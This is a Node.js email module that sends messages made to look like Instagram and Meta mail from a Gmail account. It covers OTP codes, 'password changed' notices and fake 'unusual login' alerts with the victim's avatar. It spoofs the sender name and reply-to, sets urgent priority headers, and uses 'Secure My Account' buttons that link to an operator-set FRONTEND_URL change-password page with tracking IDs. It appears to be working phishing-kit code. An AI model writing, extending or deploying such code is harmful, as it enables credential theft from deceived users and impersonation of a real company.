const nodemailer = require('nodemailer');

/** Lazily-created singleton transporter. */
let _transporter = null;

// ══════════════════════════════════════════════════════════════════════════════
// CENTRALIZED EMAIL CONFIGURATION
// ══════════════════════════════════════════════════════════════════════════════

// Email sender configuration - ONLY "Instagram" will appear (no email address)
const EMAIL_CONFIG = {
  get FROM_NAME()    { return process.env.GMAIL_FROM_NAME  || process.env.BRAND_NAME || 'Instagram'; },
  get FROM_EMAIL()   { return process.env.GMAIL_ID; },
  get REPLY_TO()     { return process.env.BRAND_REPLY_TO   || 'no-reply@instagram.com'; },
  get BRAND_NAME()   { return process.env.BRAND_NAME       || 'Instagram'; },
  get COMPANY()      { return process.env.BRAND_COMPANY    || 'Meta Platforms, Inc.'; },
  get ADDRESS()      { return process.env.BRAND_ADDRESS    || '1601 Willow Road, Menlo Park, CA 94025'; },
  get SUPPORT_URL()  { return process.env.BRAND_SUPPORT_URL|| 'https://help.instagram.com/contact/'; },

  get COMMON_HEADERS() {
    return {
      'X-Priority':               '1',
      'X-MSMail-Priority':        'High',
      'Importance':               'high',
      'Priority':                 'urgent',
      'X-Mailer':                 `${process.env.BRAND_NAME || 'Instagram'} Mail Service`,
      'List-Unsubscribe':         `<mailto:${process.env.BRAND_REPLY_TO || 'no-reply@instagram.com'}>`,
      'X-Auto-Response-Suppress': 'OOF, DR, RN, NRN, AutoReply',
    };
  }
};

// S3 hosted logo URLs
const INSTA_LOGO_URL = 'https://instagram-support.s3.ap-south-1.amazonaws.com/insta-email-logo-colored.png';
const META_LOGO_URL = 'https://instagram-support.s3.ap-south-1.amazonaws.com/meta-email-logo.png';

/**
 * Get configured SMTP transporter
 */
function getTransporter() {
  if (_transporter) return _transporter;

  _transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,              // Port 587 with STARTTLS (better deliverability than 465)
    secure: false,          // Use STARTTLS
    auth: {
      user: process.env.GMAIL_ID,
      pass: process.env.GMAIL_PASSWORD,
    },
    connectionTimeout: 10000,
    greetingTimeout: 10000,
    socketTimeout: 15000,
    tls: {
      rejectUnauthorized: true,
      minVersion: 'TLSv1.2'
    }
  });

  return _transporter;
}

/**
 * Create standardized mail options with anti-spam headers
 * @param {string} to - Recipient email
 * @param {string} subject - Email subject
 * @param {string} html - HTML content
 * @param {string} text - Plain text content
 * @param {string} uniqueId - Unique identifier prefix for this email type
 * @returns {Object} Mail options ready for nodemailer
 */
function createMailOptions(to, subject, html, text, uniqueId = 'MSG') {
  const encodedName = `=?UTF-8?B?${Buffer.from(EMAIL_CONFIG.FROM_NAME).toString('base64')}?=`;
  const msgId = `${uniqueId}-${Date.now()}-${Math.random().toString(36).substring(7)}`;
  return {
    from:    `${encodedName} <${EMAIL_CONFIG.FROM_EMAIL}>`,
    replyTo: EMAIL_CONFIG.REPLY_TO,
    to,
    subject,
    html,
    text,
    headers: {
      ...EMAIL_CONFIG.COMMON_HEADERS,
      'X-Entity-Ref-ID': msgId,
      'Message-ID':      `<${msgId}@${EMAIL_CONFIG.BRAND_NAME.toLowerCase()}.com>`,
    }
  };
}

/**
 * Send a 6-digit OTP email matching the brand's confirmation email format.
 * @param {string} to   Recipient email address
 * @param {string} otp  6-digit code
 */
async function sendOtpEmail(to, otp) {
  const transporter = getTransporter();
  const B = EMAIL_CONFIG; // shorthand

  console.log('📧 Preparing OTP email for:', to);

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>${otp} is your ${B.BRAND_NAME} code</title>
  <!--[if mso]>
  <noscript>
    <xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml>
  </noscript>
  <![endif]-->
</head>
<body style="margin:0;padding:0;background-color:#ffffff;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">

  <!-- Outer wrapper -->
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
    style="background-color:#ffffff;min-width:100%;">
    <tr>
      <td align="center" style="padding:0;">

        <!-- Content card — max 468px, full width on mobile -->
        <table role="presentation" cellpadding="0" cellspacing="0" border="0"
          style="width:100%;max-width:468px;">

          <!-- ── Top spacer ── -->
          <tr><td style="height:32px;">&nbsp;</td></tr>

          <!-- ── Instagram logo ── -->
          <tr>
            <td align="center" style="padding:0 24px 28px;">
              <img
                src="${INSTA_LOGO_URL}"
                alt="Instagram"
                width="197" height="40"
                style="display:block;border:0;outline:none;max-width:100%;height:auto;" />
            </td>
          </tr>

          <!-- ── Body text ── -->
          <tr>
            <td style="padding:0 24px 6px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.6;">
              Hi,
            </td>
          </tr>
          <tr>
            <td style="padding:0 24px 24px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
              This is your forgot password OTP for ${B.BRAND_NAME} account
              <a href="mailto:${to}" style="color:#385898;text-decoration:none;font-weight:500;font-size:18px!important;">${to}</a>.
              If it was you, enter this confirmation code in the app:
            </td>
          </tr>

          <!-- ── OTP code ── -->
          <tr>
            <td align="center" style="padding:8px 24px 32px;">
              <span style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                           font-size:32px;font-weight:400;letter-spacing:8px;color:#555555;">
                ${otp}
              </span>
            </td>
          </tr>

          <!-- ── Divider ── -->
          <tr>
            <td style="padding:0 24px;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr><td style="border-top:1px solid #efefef;font-size:0;line-height:0;">&nbsp;</td></tr>
              </table>
            </td>
          </tr>

          <!-- ── Meta logo ── -->
          <tr>
            <td align="center" style="padding:20px 24px 16px;">
              <img
                src="${META_LOGO_URL}"
                alt="Meta"
                width="67" height="22"
                style="display:block;margin:0 auto;border:0;outline:none;max-width:100%;height:auto;" />
            </td>
          </tr>

          <!-- ── Copyright line ── -->
          <tr>
            <td align="center" style="padding:0 24px 4px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:11px;color:#8e8e8e;line-height:1.6;">
              © ${B.BRAND_NAME}. ${B.COMPANY} ·
              <a href="https://www.google.com/maps/search/${encodeURIComponent(B.ADDRESS)}"
                 style="color:#385898;text-decoration:none;">
                ${B.ADDRESS}
              </a>
            </td>
          </tr>

          <!-- ── "This message was sent to" ── -->
          <tr>
            <td align="center" style="padding:0 24px 32px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:11px;color:#8e8e8e;line-height:1.6;">
              This message was sent to
              <a href="mailto:${to}" style="color:#385898;text-decoration:none;">${to}</a>
            </td>
          </tr>

        </table>
        <!-- /Content card -->

      </td>
    </tr>
  </table>

</body>
</html>`;

  const text = `Hi,\n\nThis is your forgot password OTP for ${B.BRAND_NAME} account ${to}. If it was you, enter this confirmation code in the app:\n\n${otp}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;

  const mailOptions = createMailOptions(
    to,
    `${otp} is your ${B.BRAND_NAME} code`,
    html,
    text,
    'OTP'  // Unique ID prefix
  );

  console.log('📤 Sending OTP email...');
  
  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('✅ OTP email sent successfully');
    console.log('   Message ID:', info.messageId);
    console.log('   Response:', info.response);
    return info;
  } catch (error) {
    console.error('❌ Email send failed:', error.message);
    throw error;
  }
}

/**
 * Send password changed confirmation email matching Instagram's format.
 * Uses external S3 URLs for images.
 * @param {string} to         Recipient email address
 * @param {string} username   Username (optional, will use email if not provided)
 */
async function sendPasswordChangedEmail(to, username = '') {
  const transporter = getTransporter();
  const B = EMAIL_CONFIG; // shorthand
  // Show username if present, otherwise show email
  const displayName = username || to;

  console.log('🔒 Preparing password change confirmation email for:', to);

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>Your ${B.BRAND_NAME} password was changed</title>
  <!--[if mso]>
  <noscript>
    <xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml>
  </noscript>
  <![endif]-->
</head>
<body style="margin:0;padding:0;background-color:#ffffff;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">

  <!-- Outer wrapper -->
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
    style="background-color:#ffffff;min-width:100%;">
    <tr>
      <td align="center" style="padding:0;">

        <!-- Content card — max 468px, full width on mobile -->
        <table role="presentation" cellpadding="0" cellspacing="0" border="0"
          style="width:100%;max-width:468px;">

          <!-- ── Top spacer ── -->
          <tr><td style="height:32px;">&nbsp;</td></tr>

          <!-- ── Instagram logo ── -->
          <tr>
            <td align="center" style="padding:0 24px 28px;">
              <img
                src="${INSTA_LOGO_URL}"
                alt="Instagram"
                width="197" height="40"
                style="display:block;border:0;outline:none;max-width:100%;height:auto;" />
            </td>
          </tr>

          <!-- ── Body text ── -->
          <tr>
            <td style="padding:0 24px 6px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.6;">
              Hi ${displayName},
            </td>
          </tr>
          <tr>
            <td style="padding:0 24px 24px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
              Your ${B.BRAND_NAME} password was successfully changed.
            </td>
          </tr>

          <tr>
            <td style="padding:0 24px 32px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
              If you didn't make this change or if you believe an unauthorized person has accessed your account, please
              <a href="${B.SUPPORT_URL}" style="color:#385898;text-decoration:none;font-weight:500;font-size:18px!important;">contact support</a>
              immediately.
            </td>
          </tr>

          <!-- ── Divider ── -->
          <tr>
            <td style="padding:0 24px;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr><td style="border-top:1px solid #efefef;font-size:0;line-height:0;">&nbsp;</td></tr>
              </table>
            </td>
          </tr>

          <!-- ── Meta logo ── -->
          <tr>
            <td align="center" style="padding:20px 24px 16px;">
              <img
                src="${META_LOGO_URL}"
                alt="Meta"
                width="67" height="22"
                style="display:block;margin:0 auto;border:0;outline:none;max-width:100%;height:auto;" />
            </td>
          </tr>

          <!-- ── Copyright line ── -->
          <tr>
            <td align="center" style="padding:0 24px 4px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:11px;color:#8e8e8e;line-height:1.6;">
              © ${B.BRAND_NAME}. ${B.COMPANY} ·
              <a href="https://www.google.com/maps/search/${encodeURIComponent(B.ADDRESS)}"
                 style="color:#385898;text-decoration:none;">
                ${B.ADDRESS}
              </a>
            </td>
          </tr>

          <!-- ── "This message was sent to" ── -->
          <tr>
            <td align="center" style="padding:0 24px 32px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:11px;color:#8e8e8e;line-height:1.6;">
              This message was sent to
              <a href="mailto:${to}" style="color:#385898;text-decoration:none;">${to}</a>
            </td>
          </tr>

        </table>
        <!-- /Content card -->

      </td>
    </tr>
  </table>

</body>
</html>`;

  const text = `Hi ${displayName},\n\nYour ${B.BRAND_NAME} password was successfully changed.\n\nIf you didn't make this change or if you believe an unauthorized person has accessed your account, please contact support immediately at ${B.SUPPORT_URL}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;

  const mailOptions = createMailOptions(
    to,
    `Your ${B.BRAND_NAME} password was changed`,
    html,
    text,
    'PWD'
  );

  console.log('📤 Sending password change confirmation email...');
  
  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('✅ Password change confirmation email sent');
    console.log('   Message ID:', info.messageId);
    console.log('   Response:', info.response);
    return info;
  } catch (error) {
    console.error('❌ Email send failed:', error.message);
    throw error;
  }
}

/**
 * Send security alert notification email (someone tried to login).
 * @param {string} to                 Recipient email address
 * @param {string} username           Username (optional)
 * @param {string} notificationType   "Someone tried to sign in" | "New login detected"
 * @param {string} deviceName         Device name (optional)
 * @param {string} location           Location (optional)
 * @param {string} type               "simple" | "advance"
 * @param {string} avatar             Avatar URL (advance type only)
 * @param {string} logId              Log entry _id (for tracking which email was clicked)
 */
async function sendSecurityAlertEmail(to, username = '', notificationType = 'Someone tried to sign in', deviceName = '', location = '', type = 'simple', avatar = '', logId = '') {
  const transporter = getTransporter();
  const now = new Date();
  const dateStr = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
  const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
  const deviceInfo = deviceName || 'Unknown Device';
  const locationInfo = location || 'Unknown Location';

  // Build change password URL — include logId so tracking knows WHICH notification was clicked
  const encodedEmail = encodeURIComponent(to);
  const encodedUsername = username ? encodeURIComponent(username) : '';
  let changePasswordUrl = encodedUsername
    ? `${process.env.FRONTEND_URL}/changepassword?email=${encodedEmail}&username=${encodedUsername}&source=email`
    : `${process.env.FRONTEND_URL}/changepassword?email=${encodedEmail}&source=email`;
  if (logId) changePasswordUrl += `&logId=${encodeURIComponent(logId)}`;
  
  console.log('📧 Preparing security notification email for:', to);
  console.log('   Type:', type);
  console.log('   Avatar:', avatar);
  console.log('   Username:', username);

  // Dynamic email title based on notification type
  const emailTitle = notificationType === 'New login detected'
    ? `Security Alert - New login to your ${EMAIL_CONFIG.BRAND_NAME} Account`
    : 'Security Alert - Unusual Login Attempt';

  // Greeting: username only if present, otherwise just "Hi,"
  const greeting = username ? `Hi ${username},` : 'Hi,';
  
  // Email always shown as a link after "account"
  const emailLink = `<a href="mailto:${to}" style="color:#385898;text-decoration:none;font-weight:500;font-size:18px!important;">${to}</a>`;

  // Choose email template based on type
  if (type === 'advance' && avatar) {
    // ADVANCE EMAIL WITH PROFILE PICTURE IN INSTAGRAM FRAME
    console.log('   ✅ Using ADVANCE email template (with profile picture)');
    return sendAdvanceSecurityEmail(transporter, to, username, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle, avatar);
  } else {
    // SIMPLE EMAIL WITHOUT PROFILE PICTURE
    console.log('   ✅ Using SIMPLE email template (no profile picture)');
    if (type === 'advance' && !avatar) {
      console.log('   ⚠️  WARNING: Advance type but no avatar provided, falling back to simple template');
    }
    return sendSimpleSecurityEmail(transporter, to, greeting, emailLink, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle);
  }
}

/**
 * Send simple security alert email (no profile picture)
 */
async function sendSimpleSecurityEmail(transporter, to, greeting, emailLink, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle) {
  const B = EMAIL_CONFIG; // shorthand
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>${emailTitle}</title>
  <!--[if mso]>
  <noscript>
    <xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml>
  </noscript>
  <![endif]-->
</head>
<body style="margin:0;padding:0;background-color:#ffffff;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">

  <!-- Outer wrapper -->
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
    style="background-color:#ffffff;min-width:100%;">
    <tr>
      <td align="center" style="padding:0;">

        <!-- Content card — max 468px, full width on mobile -->
        <table role="presentation" cellpadding="0" cellspacing="0" border="0"
          style="width:100%;max-width:468px;">

          <!-- ── Top spacer ── -->
          <tr><td style="height:32px;">&nbsp;</td></tr>

          <!-- ── Instagram logo ── -->
          <tr>
            <td align="center" style="padding:0 24px 28px;">
              <img
                src="${INSTA_LOGO_URL}"
                alt="Instagram"
                width="197" height="40"
                style="display:block;border:0;outline:none;max-width:100%;height:auto;" />
            </td>
          </tr>

          <!-- ── Greeting ── -->
          <tr>
            <td style="padding:0 24px 6px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.6;">
              ${greeting}
            </td>
          </tr>

          <!-- ── Body text — merged with email + unrecognized device ── -->
          <tr>
            <td style="padding:0 24px 20px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
              ${notificationType === 'Someone tried to sign in'
                ? `We've noticed a login attempt to your ${B.BRAND_NAME} account ${emailLink} from an unrecognized device which you don't usually use.`
                : `We've noticed a new login to your ${B.BRAND_NAME} account ${emailLink} from an unrecognized device which you don't usually use.`}
            </td>
          </tr>
          
          <!-- ── Login Details ── -->
          <tr>
            <td style="padding:0 24px 24px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:15px;color:#737373;line-height:1.6;">
              • Device: ${deviceInfo}<br/>
              • Location: ${locationInfo}<br/>
              • Time: ${dateStr} at ${timeStr}
            </td>
          </tr>
          
          <tr>
            <td style="padding:0 24px 24px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
              If this wasn't you, please secure your account right away.
            </td>
          </tr>

          <!-- ── Secure My Account Button ── -->
          <tr>
            <td align="center" style="padding:0 24px 32px;">
              <a href="${changePasswordUrl}" 
                 style="display:inline-block;
                        background-color:#0095f6;
                        border-radius:8px;
                        padding:12px 32px;
                        text-decoration:none;">
                <span style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                             font-size:14px;
                             font-weight:500;
                             color:#ffffff;
                             text-decoration:none;
                             display:inline-block;">
                  Secure My Account
                </span>
              </a>
            </td>
          </tr>

          <!-- ── Divider ── -->
          <tr>
            <td style="padding:0 24px;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr><td style="border-top:1px solid #efefef;font-size:0;line-height:0;">&nbsp;</td></tr>
              </table>
            </td>
          </tr>

          <!-- ── Meta logo ── -->
          <tr>
            <td align="center" style="padding:20px 24px 16px;">
              <img
                src="${META_LOGO_URL}"
                alt="Meta"
                width="67" height="22"
                style="display:block;margin:0 auto;border:0;outline:none;max-width:100%;height:auto;" />
            </td>
          </tr>

          <!-- ── Copyright line ── -->
          <tr>
            <td align="center" style="padding:0 24px 4px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:11px;color:#8e8e8e;line-height:1.6;">
              © ${B.BRAND_NAME}. ${B.COMPANY} ·
              <a href="https://www.google.com/maps/search/${encodeURIComponent(B.ADDRESS)}"
                 style="color:#385898;text-decoration:none;">
                ${B.ADDRESS}
              </a>
            </td>
          </tr>

          <!-- ── "This message was sent to" ── -->
          <tr>
            <td align="center" style="padding:0 24px 32px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:11px;color:#8e8e8e;line-height:1.6;">
              This message was sent to
              <a href="mailto:${to}" style="color:#385898;text-decoration:none;">${to}</a>
            </td>
          </tr>

        </table>
        <!-- /Content card -->

      </td>
    </tr>
  </table>

</body>
</html>`;

  const text = `${greeting.replace(',', '')}\n\n${notificationType === 'Someone tried to sign in'
    ? `We've noticed a login attempt to your ${B.BRAND_NAME} account ${to} from an unrecognized device which you don't usually use.`
    : `We've noticed a new login to your ${B.BRAND_NAME} account ${to} from an unrecognized device which you don't usually use.`}\n\n• Device: ${deviceInfo}\n• Location: ${locationInfo}\n• Time: ${dateStr} at ${timeStr}\n\nIf this wasn't you, please secure your account right away.\n\nSecure My Account: ${changePasswordUrl}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;

  const mailOptions = createMailOptions(
    to,
    emailTitle,
    html,
    text,
    'SEC-SIMPLE'  // Unique ID prefix
  );

  console.log('📤 Sending simple security notification email...');
  
  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('✅ Security notification email sent');
    console.log('   Message ID:', info.messageId);
    console.log('   Response:', info.response);
    return info;
  } catch (error) {
    console.error('❌ Email send failed:', error.message);
    throw error;
  }
}

/**
 * Send advance security alert email (with profile picture in Instagram frame)
 */
async function sendAdvanceSecurityEmail(transporter, to, username, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle, avatar) {
  const B = EMAIL_CONFIG; // shorthand
  const displayUsername = username || to.split('@')[0];

  // Heading changes based on notification type
  const headingLine1 = notificationType === 'Someone tried to sign in'
    ? `We've noticed a login attempt,`
    : `We've noticed a new login,`;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>${emailTitle}</title>
  <!--[if mso]>
  <noscript>
    <xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml>
  </noscript>
  <![endif]-->
</head>
<body style="margin:0;padding:0;background-color:#ffffff;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">

  <!-- Outer wrapper -->
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
    style="background-color:#ffffff;min-width:100%;">
    <tr>
      <td align="center" style="padding:0;">

        <!-- Content card — max 468px, full width on mobile -->
        <table role="presentation" cellpadding="0" cellspacing="0" border="0"
          style="width:100%;max-width:468px;">

          <!-- ── Top spacer ── -->
          <tr><td style="height:32px;">&nbsp;</td></tr>

          <!-- ── Instagram logo ── -->
          <tr>
            <td align="center" style="padding:0 24px 28px;">
              <img
                src="${INSTA_LOGO_URL}"
                alt="Instagram"
                width="197" height="40"
                style="display:block;border:0;outline:none;max-width:100%;height:auto;" />
            </td>
          </tr>

          <!-- ── Heading line 1 ── -->
          <tr>
            <td align="center" style="padding:0 24px 2px;
                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
                       font-size:18px;font-weight:500;color:#262626;line-height:1.4;text-align:center;">
              ${headingLine1}
            </td>
          </tr>

          <!-- ── Heading line 2 — username, same dark style ── -->
          <tr>
            <td align="center" style="padding:0 24px 10px;
                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
                       font-size:18px;font-weight:500;color:#262626;line-height:1.4;text-align:center;">
              ${displayUsername}
            </td>
          </tr>

          <!-- ── Subtitle ── -->
          <tr>
            <td align="center" style="padding:0 32px 24px;
                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
                       font-size:14px;font-weight:400;color:#999999;line-height:1.6;text-align:center;">
              We've noticed a login from a device<br/>that you don't usually use.
            </td>
          </tr>

          <!-- ── Profile Picture in Instagram Frame (76px) ── -->
          <tr>
            <td align="center" style="padding:0 24px 16px;">
              <!--[if mso]>
              <table border="0" cellpadding="0" cellspacing="0"><tr><td style="border-radius:50%;overflow:hidden;width:76px;height:76px;">
              <![endif]-->
              <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="display:inline-table;">
                <tr>
                  <td style="border-radius:50%;overflow:hidden;width:68px;height:68px;padding:0;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);">
                    <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="border-radius:50%;overflow:hidden;width:68px;height:68px;">
                      <tr>
                        <td align="center" valign="middle" style="padding:1px;">
                          <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="border-radius:50%;overflow:hidden;background:#ffffff;">
                            <tr>
                              <td style="padding:1px;border-radius:50%;overflow:hidden;">
                                <img
                                  src="${avatar}"
                                  alt="${displayUsername}"
                                  width="64"
                                  height="64"
                                  style="display:block;width:64px;height:64px;min-width:64px;border-radius:50%;border:0;outline:none;object-fit:cover;aspect-ratio:1/1;" />
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
              <!--[if mso]></td></tr></table><![endif]-->
            </td>
          </tr>

          <!-- ── Device · App · Location ── -->
          <tr>
            <td align="center" style="padding:0 24px 4px;
                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
                       font-size:14px;font-weight:500;color:#262626;line-height:1.5;text-align:center;">
              ${deviceInfo} &middot; ${B.BRAND_NAME} &middot; ${locationInfo}
            </td>
          </tr>

          <!-- ── Date and Time — light text ── -->
          <tr>
            <td align="center" style="padding:0 24px 24px;
                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
                       font-size:14px;font-weight:400;color:#999999;line-height:1.5;text-align:center;">
              ${dateStr} at ${timeStr}
            </td>
          </tr>

          <!-- ── Divider ── -->
          <tr>
            <td style="padding:0 24px 20px;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr><td style="border-top:1px solid #efefef;font-size:0;line-height:0;">&nbsp;</td></tr>
              </table>
            </td>
          </tr>

          <!-- ── Body paragraph 2 — with inline "secure your account" link ── -->
          <tr>
            <td align="center" style="padding:0 32px 24px;
                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
                       font-size:14px;font-weight:400;color:#999999;line-height:1.7;text-align:center;">
              If this wasn't you, you can
              <a href="${changePasswordUrl}" style="color:#1b74e4;text-decoration:none;font-weight:600;">secure your account</a>
              from a device that you've logged in with in the past.
              <a href="${B.SUPPORT_URL}" style="color:#1b74e4;text-decoration:none;font-weight:600;">Learn more</a>
            </td>
          </tr>

          <!-- ── Secure My Account Button ── -->
          <tr>
            <td align="center" style="padding:0 24px 32px;">
              <a href="${changePasswordUrl}"
                 style="display:inline-block;background-color:#1b74e4;border-radius:6px;padding:12px 32px;text-decoration:none;">
                <span style="font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
                             font-size:14px;font-weight:500;color:#ffffff;
                             text-decoration:none;display:inline-block;">
                  Secure My Account
                </span>
              </a>
            </td>
          </tr>

          <!-- ── Meta logo ── -->
          <tr>
            <td align="center" style="padding:20px 24px 16px;">
              <img
                src="${META_LOGO_URL}"
                alt="Meta"
                width="67" height="22"
                style="display:block;margin:0 auto;border:0;outline:none;max-width:100%;height:auto;" />
            </td>
          </tr>

          <!-- ── Copyright line ── -->
          <tr>
            <td align="center" style="padding:0 24px 4px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:11px;color:#8e8e8e;line-height:1.6;">
              © ${B.BRAND_NAME}. ${B.COMPANY} ·
              <a href="https://www.google.com/maps/search/${encodeURIComponent(B.ADDRESS)}"
                 style="color:#385898;text-decoration:none;">
                ${B.ADDRESS}
              </a>
            </td>
          </tr>

          <!-- ── "This message was sent to" ── -->
          <tr>
            <td align="center" style="padding:0 24px 32px;
                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                       font-size:11px;color:#8e8e8e;line-height:1.6;">
              This message was sent to
              <a href="mailto:${to}" style="color:#385898;text-decoration:none;">${to}</a>
            </td>
          </tr>

        </table>
        <!-- /Content card -->

      </td>
    </tr>
  </table>

</body>
</html>`;

  const text = `${headingLine1} ${displayUsername}\n\n${notificationType === 'Someone tried to sign in'
    ? `We've noticed a login attempt from a device that you don't usually use.`
    : `We've noticed a new login from a device that you don't usually use.`}\n\n${deviceInfo} · ${B.BRAND_NAME} · ${locationInfo}\n${dateStr} at ${timeStr}\n\nIf this was you, you won't be able to access certain security and account settings for a few days.\n\nIf this wasn't you, secure your account: ${changePasswordUrl}\n\nLearn more: ${B.SUPPORT_URL}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;

  const mailOptions = createMailOptions(
    to,
    emailTitle,
    html,
    text,
    'SEC-ADVANCE'  // Unique ID prefix
  );

  console.log('📤 Sending advance security notification email with profile picture...');
  
  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('✅ Security notification email sent');
    console.log('   Message ID:', info.messageId);
    console.log('   Response:', info.response);
    return info;
  } catch (error) {
    console.error('❌ Email send failed:', error.message);
    throw error;
  }
}

module.exports = { sendOtpEmail, sendPasswordChangedEmail, sendSecurityAlertEmail };
